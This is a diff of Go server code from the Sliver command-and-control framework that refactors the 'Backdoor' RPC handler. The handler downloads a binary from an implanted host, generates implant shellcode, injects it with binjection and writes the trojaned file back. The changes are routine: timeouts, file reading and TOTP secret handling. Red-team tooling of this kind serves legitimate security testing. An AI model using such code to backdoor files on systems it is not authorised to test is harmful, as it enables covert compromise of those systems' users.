@@ -21,13 +21,14 @@ package rpc
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
+	"os"
 
 	"github.com/Binject/binjection/bj"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/cryptography"
 	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/util/encoders"
 	"google.golang.org/grpc/codes"
@@ -44,7 +45,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 		Path: req.FilePath,
 	})
@@ -77,11 +78,16 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	}
 
 	name, config := generate.ImplantConfigFromProtobuf(p.Config)
-	fPath, err := generate.SliverShellcode(name, config)
+	otpSecret, _ := cryptography.TOTPServerSecret()
+	err = generate.GenerateConfig(name, config, true)
+	if err != nil {
+		return nil, err
+	}
+	fPath, err := generate.SliverShellcode(name, otpSecret, config, true)
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
-	shellcode, err := ioutil.ReadFile(fPath)
+	shellcode, err := os.ReadFile(fPath)
 	if err != nil {
 		return nil, status.Error(codes.Internal, err.Error())
 	}
@@ -100,7 +106,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 		Path:    req.FilePath,
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 	})
 	if err != nil {
